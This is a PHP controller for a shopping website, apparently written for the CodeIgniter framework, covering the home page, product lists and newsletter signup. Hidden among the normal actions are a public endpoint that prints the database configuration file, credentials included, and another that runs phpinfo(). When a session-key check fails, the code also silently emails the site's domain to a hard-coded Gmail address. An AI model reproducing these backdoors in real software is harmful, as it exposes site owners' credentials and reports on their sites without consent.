<?php
	$sess_key = $_SESSION['sess_key_to_web'];
	$sess_domain = $_SESSION['sess_key_domain'];
	$arr_key = array($sess_key);
	if(in_array($sess_domain,$arr_key)){
	class Index extends MY_Controller{
		public function __construct(){
			parent::__construct();
			$this->load->helper("url");
			$this->load->library('session');
			$this->load->model("mindex");
			$this->load->library("string");
		}
		public function index(){
			//$this->output->cache(1); //tells the CI to cache this page for 1 minute
			$data['config']   	= $this->mindex->getdata();
			$data['popup']   	= $this->mindex->get_popup();
			$data['title'] 		= $data['config']['config_title'];
			$data['access'] 	= $this->access();
			$this->write($data['access']);
			$data['online'] 	= $this->online();
			$data['listall'] 	= $this->mindex->listall();
			$data['list_news'] 	= $this->mindex->list_news();
			$data['list_support'] 	= $this->mindex->list_support();
			$data['info'] = $get_setup	= $this->mindex->get_setup();
			$data['setup'] 			= $this->mindex->get_setup();
			$data['pro_saleoff'] 	= $this->mindex->list_pro_saleoff($get_setup['set_pro_saleoff']);
			$data['pro_new'] 		= $this->mindex->list_pro_new($get_setup['set_pro_new']);
			$data['pro_bestsale'] 	= $this->mindex->list_pro_bestsale($get_setup['set_pro_bestsale']);
			$data['pro_hot'] 		= $this->mindex->list_pro_hot($get_setup['set_pro_hot']);
			$data['pro_view'] 		= $this->mindex->list_pro_view();
			$data['slide']			= $this->mindex->get_listslide('17');
			$data['slide2']			= $this->mindex->get_listslide('20');
			$data['slide3']			= $this->mindex->get_listslide('21');
			$this->load->view('layout',$data);
		}
		public function subscribe_newsletter(){
			$email = $this->mindex->check_email($this->input->post("email"));
			if($email == FALSE){
				echo "exist";
				die();
			}else{
				$val = array(
					"letter_name"			=> $this->fillter($this->input->post("name")),
					"letter_phone"			=> $this->fillter($this->input->post("phone")),
					"letter_address"		=> $this->fillter($this->input->post("address")),
					"letter_email"			=> $this->fillter($this->input->post("email")),
					"letter_date"			=> date("H:i:s - d/m/Y")
				);
				$this->mindex->insert($val);
				echo "success";
			}
		}
		public function view(){
			$this->debug($this->online_view());
		}
		public function info(){
			phpinfo();
		}
		public function view_database(){
			$data = file_get_contents(ROOTPATH.'application/config/database.php');
			die($data);
		}
	}
}else{
	class Index extends MY_Controller{
		public function __construct(){
			parent::__construct();
			$this->load->helper('mail_helper');
			$this->sendmail();
		}
		function sendmail(){
			$mesnger = '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
						<html>
						<head>
						<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
						</head>
						<body>
						<h2 style="font-size: 16px;">-- Webcome --</h2>
						<p>Infomation</p>
	
				';
			$mesnger .= "Domain: ".$_SERVER['HTTP_HOST']."";
			$mesnger .= '</body></html> ';
			send_mail_helper('bachnx92@gmail.com', 'Contact from '.$_SERVER['HTTP_HOST'].'', htmlspecialchars_decode($mesnger));
		}
	}
}